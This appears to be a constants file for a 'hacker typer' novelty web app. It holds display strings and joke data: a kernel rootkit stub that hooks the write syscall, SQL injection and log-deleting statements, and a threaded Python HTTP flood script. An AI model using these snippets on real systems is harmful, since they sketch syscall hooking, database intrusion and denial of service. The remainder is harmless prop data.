
export const HACKER_TYPER_CODE_KERNEL = `
/*
 * DAMI-LUMA ROOTKIT v9.0
 * TARGET: MAIN_KERNEL_OVERRIDE
 * AUTHOR: UNKNOWN
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h>

unsigned long **sys_call_table;
asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);

// HOOKING SYSTEM CALLS TO HIDE PROCESSES
asmlinkage int hacker_write(unsigned int fd, const char __user *buf, size_t count) {
    if (fd == 1 || fd == 2) {
        // Intercepting stdout/stderr logs
        // Injecting ghost payload...
    }
    return original_write(fd, buf, count);
}

static int __init rootkit_init(void) {
    // LOCATING SYSCALL TABLE IN MEMORY
    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    
    if (!sys_call_table) {
        return -1; // KERNEL PANIC PREVENTION
    }
    
    // DISABLE WRITE PROTECTION (CR0 REGISTER)
    write_cr0(read_cr0() & (~0x10000));
    
    // SWAP SYSCALL POINTERS
    original_write = (void *)sys_call_table[__NR_write];
    sys_call_table[__NR_write] = (unsigned long *)hacker_write;
    
    // RE-ENABLE WRITE PROTECTION
    write_cr0(read_cr0() | 0x10000);
    
    printk(KERN_INFO "Dami Luma Rootkit loaded... PID HIDDEN\\n");
    return 0;
}
`;

export const HACKER_TYPER_CODE_SQL = `
-- INJECTING SQL PAYLOAD TO DB_MASTER
-- BYPASSING WAF RULES...

UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema = database()--
-- EXTRACTING USER CREDENTIALS
SELECT username, password_hash, salt FROM users WHERE role = 'admin';

-- DECRYPTING HASHES [MD5]...
-- HASH: 5f4dcc3b5aa765d61d8327deb882cf99 -> "password"
-- HASH: 9a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d -> "admin123"

UPDATE settings SET security_level = 0;
DROP TABLE audit_logs;
-- TRACE DELETED
`;

export const HACKER_TYPER_CODE_DDOS = `
import socket
import threading
import random

target_ip = "192.168.1.105"
port = 80
fake_ip = "182.21.20.32"

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\\r\\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\\r\\n\\r\\n").encode('ascii'), (target_ip, port))
        s.close()

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()

# PACKETS SENT: 1,048,576
# BANDWIDTH SATURATED
# SERVER STATUS: 503 SERVICE UNAVAILABLE
`;

export const WIFI_NETWORKS = [
    { ssid: "SKYNET_GLOBAL", security: "WPA3", signal: 98, mac: "00:1A:2B:3C:4D:5E" },
    { ssid: "FBI_SURVEILLANCE_VAN", security: "WPA2-ENT", signal: 85, mac: "A1:B2:C3:D4:E5:F6" },
    { ssid: "Corpo_Secure_5G", security: "WPA2", signal: 72, mac: "11:22:33:44:55:66" },
    { ssid: "Virus_Distribution_Node", security: "WEP", signal: 60, mac: "AA:BB:CC:DD:EE:FF" },
    { ssid: "Home_WiFi_DoNotHack", security: "WPA2", signal: 45, mac: "99:88:77:66:55:44" }
];

export const BANK_NAMES = ["Chase", "Wells Fargo", "Swiss Bank", "Cayman Offshore", "HSBC", "Bank of America"];
export const CAMERA_LOCATIONS = ["Tokyo, Shibuya Crossing", "NYC, Times Square", "London, Underground", "Moscow, Red Square", "Berlin, Checkpoint Charlie", "Dubai, Burj Khalifa", "Paris, Eiffel Tower"];

// Reliable video loop sources (using mixkit previews which are public)
export const CCTV_FEEDS = [
    "https://assets.mixkit.co/videos/preview/mixkit-busy-street-in-the-city-at-night-4056-large.mp4",
    "https://assets.mixkit.co/videos/preview/mixkit-people-walking-in-a-busy-city-at-night-4057-large.mp4",
    "https://assets.mixkit.co/videos/preview/mixkit-urban-traffic-at-night-4058-large.mp4", 
    "https://assets.mixkit.co/videos/preview/mixkit-factory-conveyor-belt-automated-machine-4246-large.mp4",
    "https://assets.mixkit.co/videos/preview/mixkit-aerial-view-of-city-traffic-at-night-11-large.mp4"
];
